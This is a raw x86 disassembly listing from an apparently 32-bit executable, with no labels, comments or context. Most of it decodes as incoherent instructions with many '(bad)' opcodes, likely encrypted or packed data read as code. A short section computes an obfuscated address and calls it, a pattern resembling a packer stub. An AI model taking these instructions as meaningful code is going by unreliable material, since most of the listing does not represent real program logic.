  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	not    DWORD PTR [edi-0x2e]
  40dcdf:	inc    ecx
  40dce0:	mov    ch,0x89
  40dce2:	jle    0x40dd62
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dd0a
  40dce9:	dec    esi
  40dcea:	xlat   BYTE PTR fs:[ebx]
  40dcec:	inc    ebx
  40dced:	das    
  40dcee:	outs   dx,BYTE PTR ds:[esi]
  40dcef:	sub    BYTE PTR [esi],bl
  40dcf1:	rcr    DWORD PTR [eax],0x51
  40dcf4:	xor    bh,BYTE PTR [ebx-0x5]
  40dcf7:	(bad)  
  40dcf8:	jmp    0xb8cf8f3c
  40dcfd:	pop    eax
  40dcfe:	cmp    eax,0xad7026d6
  40dd03:	and    al,0x31
  40dd05:	das    
  40dd06:	fnstenv [ebp+eax*4-0x52]
  40dd0a:	cmp    al,0x57
  40dd0c:	in     al,0x93
  40dd0e:	imul   esp,edx,0xf34ecc3e
  40dd14:	je     0x40dd09
  40dd16:	and    BYTE PTR [edi+0x3859f139],dh
  40dd1c:	bound  ebx,QWORD PTR [ecx-0x34]
  40dd1f:	(bad)  
  40dd20:	out    0x48,eax
  40dd22:	retf   0x7c65
  40dd25:	sbb    esi,eax
  40dd27:	xor    edx,DWORD PTR [ecx-0x782e8d77]
  40dd2d:	fwait
  40dd2e:	cmp    DWORD PTR [edi-0x77e787fb],0xffffffcf
  40dd35:	dec    esp
  40dd36:	stos   DWORD PTR es:[edi],eax
  40dd37:	mov    ah,0x7c
  40dd39:	xchg   BYTE PTR [ecx+0x34b0f221],ch
  40dd3f:	lods   eax,DWORD PTR ds:[esi]
  40dd40:	ficomp WORD PTR [edi-0x5f8c5853]
  40dd46:	test   DWORD PTR [edx+0x23],esp
  40dd49:	pop    eax
  40dd4a:	push   0xf841b3dc
  40dd4f:	ror    BYTE PTR [edx],0x88
  40dd52:	jo     0x40dd52
  40dd54:	push   esi
  40dd55:	neg    BYTE PTR [edx+0x43]
  40dd58:	clc    
  40dd59:	cmp    BYTE PTR [ecx-0x4270ef84],dh
  40dd5f:	jl     0x40dd4f
  40dd61:	jecxz  0x40ddbd
  40dd63:	add    DWORD PTR [esi],edi
  40dd65:	fsub   DWORD PTR [ebx+edi*1]
  40dd68:	dec    edi
  40dd69:	xchg   BYTE PTR ds:0x7ae35ce5,ch
  40dd6f:	and    edx,DWORD PTR [eax-0x4111cc53]
  40dd75:	mov    DWORD PTR [eax-0x78835dbd],esi
  40dd7b:	cmp    BYTE PTR [ebx+0x5e],dl
  40dd7e:	push   edi
  40dd7f:	cmp    eax,0x8ff3ffb
  40dd84:	div    BYTE PTR [ecx]
  40dd86:	repz out dx,al
  40dd88:	out    dx,al
  40dd89:	jl     0x40dd19
  40dd8b:	push   esp
  40dd8c:	dec    ecx
  40dd8d:	shl    BYTE PTR [esi],1
  40dd8f:	pop    ecx
  40dd90:	test   DWORD PTR [ebp+0x30],ebp
  40dd93:	inc    edi
  40dd94:	jb     0x40dde0
  40dd96:	call   0x1655:0xd3df3bbd
  40dd9d:	pop    esi
  40dd9e:	pusha  
  40dd9f:	mov    DWORD PTR [ebp+0xd],ecx
  40dda2:	mov    BYTE PTR [esi-0x5c054c6f],dh
  40dda8:	iret   
  40dda9:	mov    ah,0x2e
  40ddab:	inc    edi
  40ddac:	mov    DWORD PTR [edx],eax
  40ddae:	jae    0x40ddbf
  40ddb0:	popa   
  40ddb1:	test   eax,esp
  40ddb3:	mov    edx,0xf70a49e4
  40ddb8:	and    edx,ecx
  40ddba:	in     eax,dx
  40ddbb:	arpl   WORD PTR ds:0xb4a31157,bp
  40ddc1:	fcomp  QWORD PTR [ebp+0x50]
  40ddc4:	je     0x40dd90
  40ddc6:	mov    cl,0x48
  40ddc8:	or     esi,DWORD PTR ds:0xfd4b0542
  40ddce:	pop    edx
  40ddcf:	cli    
  40ddd0:	or     ch,BYTE PTR [esi+0x79]
  40ddd3:	clc    
  40ddd4:	and    al,0x8b
  40ddd6:	cdq    
  40ddd7:	scas   al,BYTE PTR es:[edi]
  40ddd8:	inc    edx
  40ddd9:	pop    ecx
  40ddda:	or     BYTE PTR [eax],ah
  40dddc:	cwde   
  40dddd:	fisttp DWORD PTR [edi+0x4ce663e5]
  40dde3:	cli    
  40dde4:	cmp    al,0x53
  40dde6:	jle    0x40ddcf
  40dde8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dde9:	outs   dx,DWORD PTR ds:[esi]
  40ddea:	or     DWORD PTR [ebx],ebp
  40ddec:	mov    esp,0x47a6e31f
  40ddf1:	add    bh,dl
  40ddf3:	fcomp  DWORD PTR [edi]
  40ddf5:	lods   eax,DWORD PTR ds:[esi]
  40ddf6:	sub    cl,BYTE PTR [esi+eax*4+0x4985d7d4]
  40ddfd:	xchg   esp,eax
  40ddfe:	xchg   esi,eax
  40ddff:	(bad)  
  40de00:	stos   BYTE PTR es:[edi],al
  40de01:	fwait
  40de02:	rcr    al,0xc4
  40de05:	cmp    DWORD PTR [edi-0x2ec7a2d9],eax
  40de0b:	and    al,0x5c
  40de0d:	dec    ecx
  40de0e:	jno    0x40de06
  40de10:	dec    eax
  40de11:	inc    edi
  40de12:	sub    bh,BYTE PTR [ecx-0x77]
  40de15:	inc    ebp
  40de16:	or     BYTE PTR [ebx+0x558be845],cl
  40de1c:	adc    al,0x33
  40de1e:	rol    DWORD PTR [ebx],0xc6
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx+0x427cfe70],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40de4a
  40de8e:	lods   eax,DWORD PTR ds:[esi]
  40de8f:	call   0x9cb4e82b
  40de94:	xor    DWORD PTR [edi+0x43c6c469],0xffffffad
  40de9b:	push   es
  40de9c:	lea    ebx,cs:[edx-0xd147194]
  40dea3:	inc    esi
  40dea4:	dec    esi
  40dea5:	sbb    edx,DWORD PTR [edx]
  40dea7:	shr    dl,cl
  40dea9:	pop    ebx
  40deaa:	hlt    
  40deab:	(bad)  
  40dead:	pusha  
  40deae:	stos   BYTE PTR es:[edi],al
  40deaf:	lock dec esi
  40deb1:	aad    0xf0
  40deb3:	jnp    0x40de77
  40deb5:	xchg   esp,eax
  40deb6:	jl     0x40de69
  40deb8:	xchg   esi,eax
  40deb9:	fwait
  40deba:	leave  
  40debb:	popa   
  40debc:	cmc    
  40debd:	xor    eax,0x6d503005
  40dec2:	jbe    0x40de4d
  40dec4:	enter  0xefb2,0x87
  40dec8:	cmp    ch,BYTE PTR [ecx]
  40deca:	pop    edi
  40decb:	lods   eax,DWORD PTR ds:[esi]
  40decc:	sahf   
  40decd:	pop    edi
  40dece:	adc    edx,ecx
  40ded0:	inc    esp
  40ded1:	xchg   edx,eax
  40ded2:	mov    cl,0x25
  40ded4:	fdiv   QWORD PTR [edx]
  40ded6:	push   edi
  40ded7:	nop
  40ded8:	jmp    0x9d51be02
  40dedd:	mov    ebx,0xc4254bb9
  40dee2:	jmp    0x79f09c10
  40dee7:	in     al,0xf9
  40dee9:	jbe    0x40df15
  40deeb:	adc    BYTE PTR [eax-0x16f5de51],dl
  40def1:	mov    eax,0x7df53096
  40def6:	int3   
  40def7:	clc    
  40def8:	bound  eax,QWORD PTR [ecx+0x6f]
  40defb:	sub    al,BYTE PTR [ecx-0x281e999c]
  40df01:	jb     0x40deda
  40df03:	cmp    BYTE PTR [ecx+0x522ebbfa],ch
  40df09:	mov    bh,0x85
  40df0b:	ret    0x4000
  40df0e:	das    
  40df0f:	push   ebp
  40df10:	adc    eax,0x30fad44
  40df15:	jl     0x40df7c
  40df17:	jbe    0x40df27
  40df19:	inc    ebp
  40df1a:	sbb    ebx,esi
  40df1c:	stos   DWORD PTR es:[edi],eax
  40df1d:	fdiv   DWORD PTR [ebp-0x42]
  40df20:	add    eax,DWORD PTR [eax+0x45]
  40df23:	mov    al,0x94
  40df25:	dec    edi
  40df26:	sub    DWORD PTR [ebx],eax
  40df28:	pusha  
  40df29:	ja     0x40df7b
  40df2b:	pop    esp
  40df2c:	and    al,0x57
  40df2e:	in     al,dx
  40df2f:	xor    al,0x89
  40df31:	mov    ah,0xbd
  40df33:	mov    edx,0xd059d26
  40df38:	jbe    0x40df2f
  40df3a:	lahf   
  40df3b:	cmp    DWORD PTR [esi],esp
  40df3d:	sbb    eax,0x38804115
  40df42:	and    bl,BYTE PTR [edx+0x25]
  40df45:	retf   0x2478
  40df48:	push   esi
  40df49:	or     esp,edx
  40df4b:	jnp    0x40df8f
  40df4d:	add    ah,BYTE PTR [ecx-0x58730789]
  40df53:	xor    eax,0xc2ae7656
  40df59:	rcr    DWORD PTR [ebx+eax*2+0x7ee565bf],0x88
  40df61:	push   ss
  40df62:	lahf   
  40df63:	inc    edi
  40df64:	repnz cld 
  40df66:	lods   al,BYTE PTR ds:[esi]
  40df67:	cmp    bl,bh
  40df69:	ja     0x40defa
  40df6b:	aaa    
  40df6c:	jmp    0x820c:0x5c0f5897
  40df73:	pushf  
  40df74:	xchg   ebx,eax
  40df75:	xor    esi,DWORD PTR [ecx]
  40df77:	push   ebp
  40df78:	fsub   DWORD PTR [ebp-0x5836aa3]
  40df7e:	xor    al,0x9c
  40df80:	pusha  
  40df81:	inc    esi
  40df82:	xchg   bl,ah
  40df84:	ss test al,0xc3
  40df87:	push   esi
  40df88:	mov    al,0xaf
  40df8a:	jno    0x40df9b
  40df8c:	(bad)  
  40df8d:	sub    edx,DWORD PTR [ebp+0x1]
  40df90:	dec    ecx
  40df91:	dec    edx
  40df92:	int    0xe7
  40df94:	mov    cl,0xee
  40df96:	pusha  
  40df97:	cwde   
  40df98:	lods   eax,DWORD PTR ds:[esi]
  40df99:	jg     0x40dfa6
  40df9b:	cmp    BYTE PTR [eax+0xd],dh
  40df9e:	ss (bad) 
  40dfa0:	adc    dl,BYTE PTR [eax+ebp*4-0x1b]
  40dfa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfa5:	inc    eax
  40dfa6:	in     al,0x4c
  40dfa8:	repz adc cl,dl
  40dfab:	push   DWORD PTR [edx-0x706992e1]
  40dfb1:	cld    
  40dfb2:	xchg   edi,eax
  40dfb3:	imul   ebx,DWORD PTR [esi],0xffffffe9
  40dfb6:	sar    BYTE PTR [edx-0x3478bd00],1
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
